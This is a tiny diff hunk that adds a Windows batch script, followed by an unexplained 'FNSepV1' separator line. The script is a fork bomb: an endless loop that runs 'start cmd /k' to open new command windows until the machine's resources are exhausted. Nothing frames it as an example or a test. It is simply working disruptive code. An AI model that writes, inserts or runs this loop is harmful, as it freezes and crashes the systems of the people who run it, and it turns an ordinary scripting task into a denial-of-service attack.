@@ -1,0 +1,4 @@
+:loop
+start cmd /k
+goto loop
+--- FNSepV1 ---
